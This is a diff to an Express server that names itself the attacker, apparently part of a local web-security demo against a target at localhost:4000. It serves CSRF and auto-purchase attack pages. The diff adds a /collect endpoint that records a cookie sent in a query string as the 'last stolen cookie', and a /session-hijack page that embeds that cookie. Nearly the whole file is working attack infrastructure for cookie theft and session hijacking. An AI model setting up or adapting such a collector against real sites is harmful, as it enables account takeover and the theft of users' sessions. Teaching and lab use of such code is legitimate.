@@ -3,13 +3,10 @@ const path = require("path");
 const express = require("express");
 const morgan = require("morgan");
 
-const PORT = Number(process.env.PORT || 5000);
-const TARGET_BASE = process.env.TARGET_BASE || "http://localhost:4000";
+const DEFAULT_PORT = Number(process.env.PORT || 5000);
+const DEFAULT_TARGET_BASE = process.env.TARGET_BASE || "http://localhost:4000";
 
-const app = express();
-app.use(morgan("dev"));
-
-function renderPage(filename) {
+function renderPage(filename, pageData) {
   const body = fs.readFileSync(path.join(__dirname, "public", filename), "utf8");
   return `<!doctype html>
 <html lang="ja">
@@ -20,31 +17,82 @@ function renderPage(filename) {
   </head>
   <body>
     <script>
-      window.__TARGET_BASE__ = ${JSON.stringify(TARGET_BASE)};
+      window.__TARGET_BASE__ = ${JSON.stringify(pageData.targetBase)};
+      window.__LAST_STOLEN_COOKIE__ = ${JSON.stringify(pageData.lastStolenCookie)};
     </script>
     ${body}
   </body>
 </html>`;
 }
 
-app.get("/csrf", (req, res) => {
-  res.setHeader("content-type", "text/html; charset=utf-8");
-  res.send(renderPage("csrf.html"));
-});
+function createApp(options) {
+  const config = Object.assign(
+    {
+      targetBase: DEFAULT_TARGET_BASE,
+      logger: morgan("dev"),
+      state: { lastStolenCookie: "" }
+    },
+    options || {}
+  );
 
-app.get("/", (req, res) => {
-  res.setHeader("content-type", "text/html; charset=utf-8");
-  res.send(renderPage("index.html"));
-});
+  const app = express();
+  if (config.logger) {
+    app.use(config.logger);
+  }
 
-app.get("/auto-purchase", (req, res) => {
-  res.setHeader("content-type", "text/html; charset=utf-8");
-  res.send(renderPage("auto_purchase.html"));
-});
+  function render(filename) {
+    return renderPage(filename, {
+      targetBase: config.targetBase,
+      lastStolenCookie: config.state.lastStolenCookie || ""
+    });
+  }
 
-app.listen(PORT, () => {
-  // eslint-disable-next-line no-console
-  console.log(`[attacker] listening on http://localhost:${PORT}`);
-  // eslint-disable-next-line no-console
-  console.log(`[attacker] TARGET_BASE=${TARGET_BASE}`);
-});
+  app.get("/csrf", (req, res) => {
+    res.setHeader("content-type", "text/html; charset=utf-8");
+    res.send(render("csrf.html"));
+  });
+
+  app.get("/", (req, res) => {
+    res.setHeader("content-type", "text/html; charset=utf-8");
+    res.send(render("index.html"));
+  });
+
+  app.get("/auto-purchase", (req, res) => {
+    res.setHeader("content-type", "text/html; charset=utf-8");
+    res.send(render("auto_purchase.html"));
+  });
+
+  app.get("/collect", (req, res) => {
+    config.state.lastStolenCookie = String(req.query.cookie || "");
+    res.status(204).end();
+  });
+
+  app.get("/session-hijack", (req, res) => {
+    res.setHeader("content-type", "text/html; charset=utf-8");
+    res.send(render("session_hijack.html"));
+  });
+
+  app.locals.config = config;
+  return app;
+}
+
+function startServer(options) {
+  const config = Object.assign({ port: DEFAULT_PORT, host: undefined }, options || {});
+  const app = createApp(config);
+  const server = app.listen(config.port, config.host, () => {
+    // eslint-disable-next-line no-console
+    console.log(`[attacker] listening on http://localhost:${server.address().port}`);
+    // eslint-disable-next-line no-console
+    console.log(`[attacker] TARGET_BASE=${config.targetBase || DEFAULT_TARGET_BASE}`);
+  });
+  return { app: app, server: server };
+}
+
+if (require.main === module) {
+  startServer();
+}
+
+module.exports = {
+  createApp: createApp,
+  startServer: startServer
+};
